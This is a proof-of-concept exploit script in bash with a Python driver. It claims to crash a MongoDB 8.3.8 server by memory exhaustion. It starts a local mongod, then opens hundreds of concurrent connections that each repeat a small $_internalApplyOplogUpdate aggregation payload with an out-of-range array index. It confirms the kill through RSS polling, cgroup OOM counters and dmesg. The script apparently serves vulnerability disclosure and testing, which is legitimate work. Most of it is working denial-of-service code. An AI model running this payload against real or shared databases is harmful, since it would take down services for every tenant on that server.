#!/usr/bin/env bash
#
# poc.sh -- MongoDB 8.3.8 $_internalApplyOplogUpdate concurrent-request OOM crash
#
# Any client holding nothing but ordinary find/aggregate on a collection it owns can crash the
# whole mongod process for every other tenant, by opening a modest number of concurrent
# connections and repeatedly sending a ~250-byte $_internalApplyOplogUpdate payload naming an
# out-of-range array index. Each request alone is capped at 125MB by a generic buffer ceiling
# (bson/util/builder.h BufferMaxSize) -- but nothing caps how many such requests run
# CONCURRENTLY, so N_CONCURRENT of them held near that ceiling at once pushes total RSS past
# the host/container memory ceiling and the kernel OOM-killer takes the process out.
#
# See README.md in this directory for the full root-cause writeup and live-run evidence.
#
# Usage:
#   ./poc.sh                       # defaults: 300 concurrent conns, 180s budget
#   N_CONCURRENT=400 DURATION=240 ./poc.sh
#   MONGOD_BIN=/path/to/mongod ./poc.sh   # skip download, use a binary you already have
#
# WARNING: this WILL crash the target mongod via a real kernel OOM-kill. Only point it at a
# disposable, isolated instance you control -- never shared or production infrastructure.

set -u

N_CONCURRENT="${N_CONCURRENT:-300}"
DURATION="${DURATION:-180}"
PORT="${PORT:-27119}"
RUN_ID="$$"
WORK_DIR="$(mktemp -d /tmp/oplogupdate_oom_poc.XXXXXX)"
LOG_FILE="${WORK_DIR}/mongod.log"
MONGOD_VERSION="8.3.8"
MONGOD_TARBALL_URL="https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu2204-${MONGOD_VERSION}.tgz"

echo "== MongoDB 8.3.8 \$_internalApplyOplogUpdate concurrent-request OOM crash PoC =="
echo "work dir: ${WORK_DIR}"
echo "port: ${PORT}  concurrency: ${N_CONCURRENT}  duration: ${DURATION}s"
echo

# ---------------------------------------------------------------------------
# 1. Locate or fetch a mongod 8.3.8 binary.
# ---------------------------------------------------------------------------
find_local_mongod() {
    # Honor an explicit override first.
    if [ -n "${MONGOD_BIN:-}" ] && [ -x "${MONGOD_BIN}" ]; then
        echo "${MONGOD_BIN}"
        return 0
    fi
    # Common places a prior download/extraction might already live.
    local candidate
    candidate=$(find / -xdev -iname "mongod" -type f -perm -u+x 2>/dev/null \
        | grep -i "mongodb-linux" | head -1)
    if [ -n "${candidate}" ]; then
        echo "${candidate}"
        return 0
    fi
    return 1
}

MONGOD_BIN="$(find_local_mongod || true)"

if [ -z "${MONGOD_BIN}" ]; then
    echo "[*] No local mongod binary found -- looking for a cached tarball..."
    TARBALL="$(find / -xdev -iname "mongodb-linux-x86_64-*${MONGOD_VERSION}*.tgz" 2>/dev/null | head -1)"
    if [ -z "${TARBALL}" ]; then
        echo "[*] No cached tarball either -- downloading ${MONGOD_TARBALL_URL} ..."
        TARBALL="${WORK_DIR}/mongodb.tgz"
        if ! curl -fsSL --max-time 180 -o "${TARBALL}" "${MONGOD_TARBALL_URL}"; then
            echo "FATAL: could not obtain a mongod ${MONGOD_VERSION} binary (no local copy, download failed)." >&2
            echo "        Set MONGOD_BIN=/path/to/mongod to point at one you already have." >&2
            exit 1
        fi
    fi
    echo "[*] Extracting ${TARBALL} ..."
    tar -xzf "${TARBALL}" -C "${WORK_DIR}"
    MONGOD_BIN="$(find "${WORK_DIR}" -type f -name mongod -perm -u+x | head -1)"
    if [ -z "${MONGOD_BIN}" ]; then
        echo "FATAL: extracted tarball but could not find a mongod executable inside it." >&2
        exit 1
    fi
fi

echo "[*] Using mongod binary: ${MONGOD_BIN}"
"${MONGOD_BIN}" --version | head -3
echo

# ---------------------------------------------------------------------------
# 2. cgroup v2 oom_kill counter helpers (works without special privilege; dmesg is often
#    blocked inside containers, but this file usually isn't).
# ---------------------------------------------------------------------------
read_cgroup_oom_kills() {
    local cg_path
    cg_path=$(awk -F: '$2=="" {print $3}' /proc/self/cgroup 2>/dev/null | head -1)
    local candidates=(
        "/sys/fs/cgroup/memory.events"
        "/sys/fs/cgroup${cg_path}/memory.events"
    )
    for f in "${candidates[@]}"; do
        if [ -r "$f" ]; then
            awk '/^oom_kill /{print $2; found=1} END{if(!found) print 0}' "$f"
            return 0
        fi
    done
    echo "unavailable"
}

BASELINE_OOM_KILLS="$(read_cgroup_oom_kills)"
echo "[*] Baseline cgroup oom_kill counter: ${BASELINE_OOM_KILLS}"
echo

# ---------------------------------------------------------------------------
# 3. Preserve evidence on ANY exit path (crash included) before cleaning up.
# ---------------------------------------------------------------------------
PRESERVED_LOG=""
PRESERVED_DMESG=""
cleanup() {
    local exit_code=$?
    echo
    echo "[*] Cleaning up..."

    if [ -f "${LOG_FILE}" ]; then
        PRESERVED_LOG="/tmp/oplogupdate_oom_poc_mongod_log_${RUN_ID}.txt"
        tail -n 400 "${LOG_FILE}" > "${PRESERVED_LOG}" 2>/dev/null
        echo "    mongod log tail preserved at: ${PRESERVED_LOG}"
    fi

    if [ -n "${MONGOD_PID:-}" ] && [ -d "/proc/${MONGOD_PID}" ]; then
        echo "    mongod (pid ${MONGOD_PID}) still running -- stopping it."
        kill "${MONGOD_PID}" 2>/dev/null
        sleep 2
        kill -9 "${MONGOD_PID}" 2>/dev/null
    fi

    # Check for a core dump before wiping the work dir.
    local core
    core=$(find "${WORK_DIR}" -maxdepth 2 -iname "core*" 2>/dev/null | head -1)
    if [ -n "${core}" ]; then
        echo "    WARNING: core dump found at ${core} -- copying before cleanup."
        cp "${core}" "/tmp/oplogupdate_oom_poc_core_${RUN_ID}" 2>/dev/null
    fi

    if command -v dmesg >/dev/null 2>&1; then
        PRESERVED_DMESG="/tmp/oplogupdate_oom_poc_dmesg_${RUN_ID}.txt"
        dmesg 2>/dev/null | tail -60 > "${PRESERVED_DMESG}"
    fi

    rm -rf "${WORK_DIR}"
    exit "${exit_code}"
}
trap cleanup EXIT INT TERM

# ---------------------------------------------------------------------------
# 4. Start a disposable standalone mongod.
# ---------------------------------------------------------------------------
mkdir -p "${WORK_DIR}/data"
echo "[*] Starting mongod on port ${PORT} ..."
"${MONGOD_BIN}" --dbpath "${WORK_DIR}/data" --logpath "${LOG_FILE}" \
    --port "${PORT}" --bind_ip 127.0.0.1 --fork

sleep 2
if ! grep -q "Waiting for connections" "${LOG_FILE}" 2>/dev/null; then
    echo "[*] Waiting a bit longer for mongod to come up..."
    for _ in $(seq 1 15); do
        grep -q "Waiting for connections" "${LOG_FILE}" 2>/dev/null && break
        sleep 1
    done
fi

MONGOD_PID="$(pgrep -f "${MONGOD_BIN}.*--port ${PORT}" | head -1)"
if [ -z "${MONGOD_PID}" ] || [ ! -d "/proc/${MONGOD_PID}" ]; then
    echo "FATAL: mongod did not start. Log tail:" >&2
    tail -30 "${LOG_FILE}" >&2
    exit 1
fi
echo "[*] mongod is up, pid ${MONGOD_PID}"
echo

# ---------------------------------------------------------------------------
# 5. Fire the attack: N_CONCURRENT connections, each looping the
#    $_internalApplyOplogUpdate positional-index-overflow payload, while polling
#    /proc/<pid>/status for RSS and liveness.
# ---------------------------------------------------------------------------
if ! python3 -c "import pymongo" 2>/dev/null; then
    echo "FATAL: this PoC's attack driver needs pymongo (pip install pymongo)." >&2
    exit 1
fi

echo "[*] Launching attack: ${N_CONCURRENT} concurrent connections, ${DURATION}s budget..."
echo "    (every request errors out at the per-request 125MB cap -- the crash comes from"
echo "     the CONCURRENT population of requests all holding memory near that cap at once)"
echo

python3 - "${MONGOD_PID}" "${PORT}" "${N_CONCURRENT}" "${DURATION}" <<'PYEOF'
import pymongo, threading, time, os, sys

pid = int(sys.argv[1])
port = int(sys.argv[2])
n_concurrent = int(sys.argv[3])
duration = int(sys.argv[4])

c = pymongo.MongoClient(f"mongodb://127.0.0.1:{port}/", serverSelectionTimeoutMS=20000)
db = c.oplogupdate_oom_poc
db.t.drop()
db.t.insert_one({"_id": 1, "arr": [1, 2, 3]})

PAYLOAD = [{"$_internalApplyOplogUpdate": {
    "oplogUpdate": {"$v": 2, "diff": {"sarr": {"a": True, "u999999999": 1}}}}}]

stop = threading.Event()
counters = {"oks": 0, "errs": 0}
lock = threading.Lock()

def worker():
    cl = pymongo.MongoClient(f"mongodb://127.0.0.1:{port}/",
                              serverSelectionTimeoutMS=5000, connectTimeoutMS=5000)
    d = cl.oplogupdate_oom_poc
    while not stop.is_set():
        try:
            list(d.t.aggregate(PAYLOAD))
            with lock: counters["oks"] += 1
        except Exception:
            with lock: counters["errs"] += 1
    try:
        cl.close()
    except Exception:
        pass

threads = [threading.Thread(target=worker, daemon=True) for _ in range(n_concurrent)]
for t in threads:
    t.start()

crashed = False
t0 = time.time()
while time.time() - t0 < duration:
    elapsed = time.time() - t0
    if not os.path.exists(f"/proc/{pid}"):
        print(f"t={elapsed:.1f}s *** mongod pid {pid} GONE -- CRASH CONFIRMED ***")
        crashed = True
        break
    try:
        with open(f"/proc/{pid}/status") as f:
            rss = "?"
            for line in f:
                if line.startswith("VmRSS:"):
                    rss = line.split()[1]
        with lock:
            oks, errs = counters["oks"], counters["errs"]
        print(f"t={elapsed:.1f}s RSS={rss}kB oks={oks} errs={errs}")
    except FileNotFoundError:
        print(f"t={elapsed:.1f}s *** mongod pid {pid} GONE (raced) -- CRASH CONFIRMED ***")
        crashed = True
        break
    time.sleep(2)

stop.set()
if not crashed:
    print(f"Budget exhausted -- mongod still alive (RSS was still climbing; "
          f"try a longer DURATION or higher N_CONCURRENT).")
sys.exit(0 if crashed else 2)
PYEOF
ATTACK_EXIT=$?
echo

# ---------------------------------------------------------------------------
# 6. Verdict.
# ---------------------------------------------------------------------------
echo "== Verdict =="

if [ -d "/proc/${MONGOD_PID}" ]; then
    echo "mongod (pid ${MONGOD_PID}) is STILL RUNNING -- no crash observed in this run."
    echo "Try N_CONCURRENT=500 DURATION=300 ./poc.sh, or check host free memory (crash"
    echo "threshold scales with the container/cgroup memory ceiling, not a fixed size)."
    exit 0
fi

echo "mongod (pid ${MONGOD_PID}) is GONE."

CURRENT_OOM_KILLS="$(read_cgroup_oom_kills)"
echo "cgroup oom_kill counter: baseline=${BASELINE_OOM_KILLS} now=${CURRENT_OOM_KILLS}"

CONFIRMED_OOM=0
if [ "${BASELINE_OOM_KILLS}" != "unavailable" ] && [ "${CURRENT_OOM_KILLS}" != "unavailable" ]; then
    if [ "${CURRENT_OOM_KILLS}" -gt "${BASELINE_OOM_KILLS}" ] 2>/dev/null; then
        CONFIRMED_OOM=1
    fi
fi

if command -v dmesg >/dev/null 2>&1; then
    if dmesg 2>/dev/null | tail -60 | grep -q "Killed process ${MONGOD_PID} (mongod)"; then
        CONFIRMED_OOM=1
        echo "dmesg confirms kernel OOM-kill of pid ${MONGOD_PID}:"
        dmesg 2>/dev/null | grep "Killed process ${MONGOD_PID} (mongod)"
    fi
fi

# A real OOM-kill is SIGKILL: uncatchable, so the log has no shutdown-sequence lines at all.
# A graceful termination (e.g. an external memory-pressure supervisor sending SIGTERM before
# the kernel's own OOM path triggers) DOES log a shutdown sequence -- still a crash caused by
# this bug's memory growth, just a different kill mechanism catching it first.
if [ -n "${PRESERVED_LOG}" ] && [ -f "${PRESERVED_LOG}" ]; then
    if grep -q '"signal":[0-9]*' "${PRESERVED_LOG}" 2>/dev/null; then
        echo "mongod's own log shows a caught signal (graceful termination path):"
        grep -o '"signal":[0-9]*.*"pid":[0-9]*,"uid":[0-9]*' "${PRESERVED_LOG}" | tail -1
        echo "(signal 15/SIGTERM sent by pid:0 typically means an external, platform-level"
        echo " memory-pressure supervisor intervened before the kernel's own cgroup OOM-killer"
        echo " would have -- same root cause, different enforcement layer catching it.)"
    else
        echo "mongod's log has NO shutdown-sequence lines -- consistent with an uncatchable SIGKILL."
    fi
fi

if [ "${CONFIRMED_OOM}" -eq 1 ]; then
    echo
    echo "RESULT: CRASH CONFIRMED -- kernel cgroup OOM-killer terminated mongod."
    exit 0
elif [ "${ATTACK_EXIT}" -eq 0 ]; then
    echo
    echo "RESULT: mongod process is gone; OOM evidence inconclusive in this environment"
    echo "(dmesg/cgroup access may be restricted here) -- see preserved log/dmesg files for"
    echo "manual signal/sender analysis:"
    [ -n "${PRESERVED_LOG}" ] && echo "  ${PRESERVED_LOG}"
    [ -n "${PRESERVED_DMESG}" ] && echo "  ${PRESERVED_DMESG}"
    exit 0
fi
